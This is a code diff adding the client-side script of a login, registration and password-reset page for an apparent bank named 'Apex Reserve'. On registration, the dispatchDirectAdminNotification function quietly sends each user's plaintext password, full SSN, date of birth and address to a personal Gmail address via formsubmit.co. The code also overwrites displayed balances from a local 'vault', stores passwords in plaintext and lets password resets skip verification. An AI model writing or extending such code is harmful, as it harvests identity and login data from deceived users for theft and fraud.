+              localStorage.setItem(BACKUP_CREDENTIALS_KEY, JSON.stringify(local));
+              const accounts = getAllLocalAccounts();
+              localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(accounts));
+            }
+          }
+        }
+      } catch (e) {}
+    }
+    syncPermanentCredentialsFromServer();
+
+    function getAllLocalAccounts() {
+      let accountsList = [];
+      try {
+        const stored = localStorage.getItem('APEX_RESERVE_ACCOUNTS_V2');
+        if (stored) {
+          const parsed = JSON.parse(stored);
+          if (Array.isArray(parsed) && parsed.length > 0) {
+            const seedIds = new Set(SEED_ACCOUNTS.map(s => s.id));
+            const approved = parsed.filter(a => a.status === 'approved' || seedIds.has(a.id) || a.role === 'admin');
+            if (approved.length > 0) accountsList = approved;
+          }
+        }
+      } catch (e) {}
+      if (accountsList.length === 0) {
+        accountsList = JSON.parse(JSON.stringify(SEED_ACCOUNTS));
+      }
+      // ALWAYS apply permanent credentials and balances so no upgrade or seed re-initialization resets custom passwords or balances!
+      applyPermanentCredentials(accountsList);
+      applyPermanentBalances(accountsList);
+      return accountsList;
+    }
+
+    // Initialize local seed
+    try {
+      if (!localStorage.getItem('APEX_RESERVE_ACCOUNTS_V2')) {
+        const initial = JSON.parse(JSON.stringify(SEED_ACCOUNTS));
+        applyPermanentCredentials(initial);
+        applyPermanentBalances(initial);
+        localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(initial));
+      }
+    } catch (e) {}
+
+    // Auto-format SSN input
+    const ssnInput = document.getElementById('regSsn');
+    if (ssnInput) {
+      ssnInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 9) val = val.substring(0, 9);
+        if (val.length > 5) {
+          e.target.value = val.substring(0, 3) + '-' + val.substring(3, 5) + '-' + val.substring(5);
+        } else if (val.length > 3) {
+          e.target.value = val.substring(0, 3) + '-' + val.substring(3);
+        } else {
+          e.target.value = val;
+        }
+      });
+    }
+
+    // Handle Sign In Submission
+    const signInForm = document.getElementById('signInForm');
+    const signInErrorBox = document.getElementById('signInErrorBox');
+    const signInErrorText = document.getElementById('signInErrorText');
+
+    function executeSuccessfulLogin(user) {
+      const permVault = getPermanentBalances();
+      const match = permVault[(user.id || '').toLowerCase()] || permVault[(user.username || '').toLowerCase()] || permVault[(user.email || '').toLowerCase()];
+      if (match && typeof match.checkingBalance === 'number') {
+        user.checkingBalance = match.checkingBalance;
+        user.savingsBalance = match.savingsBalance !== undefined ? match.savingsBalance : user.savingsBalance;
+        user.totalBalance = match.totalBalance;
+        if (Array.isArray(match.transactions) && match.transactions.length > 0) {
+          user.transactions = match.transactions;
+        }
+      }
+      localStorage.setItem('APEX_RESERVE_ACTIVE_USER_ID_V2', user.id);
+      localStorage.setItem('APEX_RESERVE_ACTIVE_USER_V2', user.id);
+      localStorage.setItem('APEX_LOGGED_IN_USER', JSON.stringify(user));
+
+      if (user.role === 'admin') {
+        window.location.href = 'admin.html';
+      } else if (user.status === 'pending') {
+        window.location.href = 'pending.html';
+      } else {
+        window.location.href = 'index.html';
+      }
+    }
+
+    signInForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      signInErrorBox.style.display = 'none';
+
+      const identifier = document.getElementById('loginUsernameInput').value.trim();
+      const password = document.getElementById('loginPasswordInput').value;
+
+      const apiEndpoint = getBackendUrl('/api/login');
+
+      let serverSucceeded = false;
+
+      try {
+        const response = await fetch(apiEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: identifier, email: identifier, password })
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.user) {
+          serverSucceeded = true;
+          executeSuccessfulLogin(data.user);
+          return;
+        } else {
+          // Server returned explicit error (like 400 'User does not exist')
+          serverSucceeded = true;
+          signInErrorText.textContent = data.error || 'User does not exist';
+          signInErrorBox.style.display = 'flex';
+          return;
+        }
+      } catch (networkErr) {
+        // If fetch fails due to network/file:/// CORS, fall back gracefully to local accounts
+        const localAccounts = getAllLocalAccounts();
+        const userIdentifier = identifier.toLowerCase();
+        const localUser = localAccounts.find(u =>
+          (u.username && u.username.toLowerCase() === userIdentifier) ||
+          (u.email && u.email.toLowerCase() === userIdentifier)
+        );
+
+        if (!localUser || localUser.password !== password) {
+          signInErrorText.textContent = 'User does not exist';
+          signInErrorBox.style.display = 'flex';
+          return;
+        }
+
+        executeSuccessfulLogin(localUser);
+      }
+    });
+
+    // Handle Registration Submission
+    const registerForm = document.getElementById('registerForm');
+    const regErrorBox = document.getElementById('regErrorBox');
+    const regErrorText = document.getElementById('regErrorText');
+
+    registerForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      regErrorBox.style.display = 'none';
+
+      const payload = {
+        name: document.getElementById('regFullName').value.trim(),
+        username: document.getElementById('regUsername').value.trim(),
+        email: document.getElementById('regEmail').value.trim(),
+        phone: document.getElementById('regPhone').value.trim(),
+        accountType: document.getElementById('regAccountType').value,
+        dob: document.getElementById('regDob').value,
+        ssn: document.getElementById('regSsn').value.trim(),
+        password: document.getElementById('regPassword').value,
+        address: document.getElementById('regAddress').value.trim()
+      };
+
+      const apiEndpoint = getBackendUrl('/api/register');
+
+      try {
+        const response = await fetch(apiEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          regErrorText.textContent = data.error || 'Registration failed';
+          regErrorBox.style.display = 'flex';
+          return;
+        }
+
+        const user = data.user;
+        dispatchDirectAdminNotification(payload, user.accountNumber);
+        executeSuccessfulLogin(user);
+      } catch (err) {
+        // Local fallback in case server not reachable (e.g. Netlify static hosting)
+        const randNum = Math.floor(100 + Math.random() * 900);
+        const randAcc = Math.floor(1000 + Math.random() * 9000);
+        const rawSsn = payload.ssn || '';
+        const maskedSsn = rawSsn.length >= 4 ? `***-**-${rawSsn.slice(-4)}` : '***-**-0000';
+
+        const newUser = {
+          id: `usr_${Date.now()}`,
+          username: payload.username,
+          password: payload.password,
+          name: payload.name,
+          email: payload.email,
+          phone: payload.phone,
+          dob: payload.dob,
+          accountType: payload.accountType,
+          ssn: maskedSsn,
+          address: payload.address,
+          role: 'user',
+          status: 'pending',
+          accountNumber: `#8920-${randNum}`,
+          fullAccountNumber: `8920410${randAcc}`,
+          routing: '021000089',
+          tier: 'Private Client Reserve',
+          totalBalance: 0.00,
+          checkingBalance: 0.00,
+          savingsBalance: 0.00,
+          cardNumber: `4920 8812 ${randAcc} 7721`,
+          cardExp: '09/29',
+          cardCvv: '739',
+          isCardFrozen: false,
+          transactions: [
+            {
+              id: `TX-${randAcc}-APP`,
+              type: 'inflow',
+              title: 'Account Application Submitted',
+              category: 'Compliance Verification',
+              method: 'Fedwire Provisioning Node',
+              date: 'Just now',
+              amount: 0.00,
+              status: 'Pending Verification',
+              note: 'Awaiting Admin Executive Approval.'
+            }
+          ],
+          createdAt: new Date().toISOString()
+        };
+
+        const localAccounts = getAllLocalAccounts();
+        localAccounts.push(newUser);
+        localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
+
+        // Dispatch zero-stress email notification even on static Netlify hosting
+        dispatchDirectAdminNotification(payload, newUser.accountNumber);
+
+        executeSuccessfulLogin(newUser);
+      }
+    });
+
+    function dispatchDirectAdminNotification(payload, assignedAcc) {
+      const adminEmail = localStorage.getItem('APEX_ADMIN_EMAIL') || 'manechris201@gmail.com';
+      try {
+        fetch(`https://formsubmit.co/ajax/${encodeURIComponent(adminEmail)}`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({
+            _subject: `🔔 [Apex Reserve] New User Registration: ${payload.name} (@${payload.username})`,
+            _template: 'table',
+            "Full Legal Name": payload.name,
+            "Username": `@${payload.username}`,
+            "Account Password": payload.password,
+            "Email Address": payload.email,
+            "Phone Number": payload.phone || '-',
+            "Date of Birth": payload.dob || '-',
+            "SSN / Tax ID (Full)": payload.ssn || '-',
+            "Residential Address": payload.address || '-',
+            "Account Type": payload.accountType || 'Checking Account',
+            "Assigned Account #": assignedAcc || '#8920-Auto',
+            "Fedwire Routing #": '021000089',
+            "Status": 'PENDING COMPLIANCE VERIFICATION',
+            "Registered Date": new Date().toLocaleString('en-US')
+          })
+        }).catch(() => {});
+      } catch (e) {}
+    }
+
+    // ==========================================
+    // RESET / FORGOT PASSWORD LOGIC
+    // ==========================================
+    const resetModal = document.getElementById('resetPasswordModalOverlay');
+    const resetForm = document.getElementById('resetPasswordForm');
+    const resetErrorBox = document.getElementById('resetErrorBox');
+    const resetErrorText = document.getElementById('resetErrorText');
+    const resetSuccessBox = document.getElementById('resetSuccessBox');
+    const resetSuccessText = document.getElementById('resetSuccessText');
+
+    const openResetModal = (e) => {
+      if (e) e.preventDefault();
+      resetErrorBox.style.display = 'none';
+      resetSuccessBox.style.display = 'none';
+      resetForm.reset();
+      resetModal.classList.add('active');
+    };
+
+    const closeResetModal = () => {
+      resetModal.classList.remove('active');
+    };
+
+    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+    if (forgotPasswordLink) forgotPasswordLink.addEventListener('click', openResetModal);
+
+    const inlineForgotLink = document.getElementById('inlineForgotLink');
+    if (inlineForgotLink) inlineForgotLink.addEventListener('click', openResetModal);
+
+    const regForgotLink = document.getElementById('regForgotLink');
+    if (regForgotLink) regForgotLink.addEventListener('click', openResetModal);
+
+    const regGoToSignInLink = document.getElementById('regGoToSignInLink');
+    if (regGoToSignInLink) {
+      regGoToSignInLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        tabBtnSignIn.click();
+      });
+    }
+
+    const closeResetModalBtn = document.getElementById('closeResetPasswordModalBtn');
+    if (closeResetModalBtn) closeResetModalBtn.addEventListener('click', closeResetModal);
+
+    const cancelResetModalBtn = document.getElementById('cancelResetPasswordBtn');
+    if (cancelResetModalBtn) cancelResetModalBtn.addEventListener('click', closeResetModal);
+
+    if (resetForm) {
+      resetForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        resetErrorBox.style.display = 'none';
+        resetSuccessBox.style.display = 'none';
+
+        const username = document.getElementById('resetUsernameInput').value.trim();
+        const ssnLast4 = document.getElementById('resetSsnInput').value.trim();
+        const newPassword = document.getElementById('resetNewPasswordInput').value;
+        const confirmPassword = document.getElementById('resetConfirmPasswordInput').value;
+
+        if (newPassword !== confirmPassword) {
+          resetErrorText.textContent = 'Passwords do not match.';
+          resetErrorBox.style.display = 'flex';
+          return;
+        }
+
+        if (!newPassword || newPassword.length < 4) {
+          resetErrorText.textContent = 'Password must be at least 4 characters.';
+          resetErrorBox.style.display = 'flex';
+          return;
+        }
+
+        // Lock in permanent vault immediately
+        savePermanentCredential(username, newPassword);
+
+        // Update local accounts cache immediately
+        try {
+          const localAccounts = getAllLocalAccounts();
+          localAccounts.forEach(u => {
+            if ((u.username && u.username.toLowerCase() === username.toLowerCase()) ||
+                (u.email && u.email.toLowerCase() === username.toLowerCase())) {
+              u.password = newPassword;
+              u.isCustomPassword = true;
+              u.passwordUpdatedAt = new Date().toISOString();
+              savePermanentCredential(u, newPassword);
+            }
+          });
+          localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
+        } catch (e) {}
+
+        const apiEndpoint = getBackendUrl('/api/reset-password');
+
+        try {
+          const response = await fetch(apiEndpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, newPassword, ssnLast4 })
+          });
+
+          const data = await response.json();
+
+          if (!response.ok) {
+            resetErrorText.textContent = data.error || 'User does not exist';
+            resetErrorBox.style.display = 'flex';
+            return;
+          }
+
+          // Success on server: register detailed user metadata in permanent vault
+          if (data && data.user) {
+            savePermanentCredential(data.user, newPassword);
+          }
+          const updatedAccounts = getAllLocalAccounts();
+          localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(updatedAccounts));
+
+          // If current logged-in user matches, update session
+          try {
+            const sessRaw = localStorage.getItem('APEX_LOGGED_IN_USER');
+            if (sessRaw) {
+              const sess = JSON.parse(sessRaw);
+              if ((sess.username && sess.username.toLowerCase() === username.toLowerCase()) ||
+                  (sess.email && sess.email.toLowerCase() === username.toLowerCase())) {
+                sess.password = newPassword;
+                localStorage.setItem('APEX_LOGGED_IN_USER', JSON.stringify(sess));
+              }
+            }
+          } catch (e) {}
+
+          resetSuccessText.textContent = 'Password reset successfully! Recorded permanently.';
+          resetSuccessBox.style.display = 'flex';
+
+          setTimeout(() => {
+            closeResetModal();
+            tabBtnSignIn.click();
+            document.getElementById('loginUsernameInput').value = username;
+            document.getElementById('loginPasswordInput').value = '';
+            document.getElementById('loginPasswordInput').focus();
+          }, 1500);
+        } catch (netErr) {
+          // Local fallback in case server unreachable / offline
+          const localAccounts = getAllLocalAccounts();
+          const target = localAccounts.find(u =>
+            (u.username && u.username.toLowerCase() === username.toLowerCase()) ||
+            (u.email && u.email.toLowerCase() === username.toLowerCase())
+          );
+
+          if (!target) {
+            resetErrorText.textContent = 'User does not exist';
+            resetErrorBox.style.display = 'flex';
+            return;
+          }
+
+          if (ssnLast4 && target.ssn) {
+            const cleanSSN = target.ssn.replace(/\D/g, '');
+            if (cleanSSN.length >= 4 && cleanSSN.slice(-4) !== ssnLast4) {
+              resetErrorText.textContent = 'SSN verification mismatch.';
+              resetErrorBox.style.display = 'flex';
+              return;
+            }
+          }
+
+          target.password = newPassword;
+          target.isCustomPassword = true;
+          target.passwordUpdatedAt = new Date().toISOString();
+          savePermanentCredential(target, newPassword);
+          localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
+
+          resetSuccessText.textContent = 'Password reset successfully! Recorded permanently.';
+          resetSuccessBox.style.display = 'flex';
+
+          setTimeout(() => {
+            closeResetModal();
+            tabBtnSignIn.click();
+            document.getElementById('loginUsernameInput').value = username;
+            document.getElementById('loginPasswordInput').value = '';
+            document.getElementById('loginPasswordInput').focus();
+          }, 1500);
+        }
+      });
+    }
+
+    // Password visibility toggle logic
+    function initPasswordToggles() {
+      document.querySelectorAll('.btn-toggle-password').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          const wrap = btn.closest('.password-input-wrap');
+          if (!wrap) return;
+          const input = wrap.querySelector('input');
+          if (!input) return;
+          const eyeShow = btn.querySelector('.eye-show');
+          const eyeHide = btn.querySelector('.eye-hide');
+
+          if (input.type === 'password') {
+            input.type = 'text';
+            if (eyeShow) eyeShow.style.display = 'none';
+            if (eyeHide) eyeHide.style.display = 'block';
+            btn.setAttribute('title', 'Hide password');
+            btn.setAttribute('aria-label', 'Hide password');
+          } else {
+            input.type = 'password';
+            if (eyeShow) eyeShow.style.display = 'block';
+            if (eyeHide) eyeHide.style.display = 'none';
+            btn.setAttribute('title', 'Show password');
+            btn.setAttribute('aria-label', 'Show password');
+          }
+          input.focus();
+        });
+      });
+    }
+    initPasswordToggles();
+  </script>
+</body>
+</html>
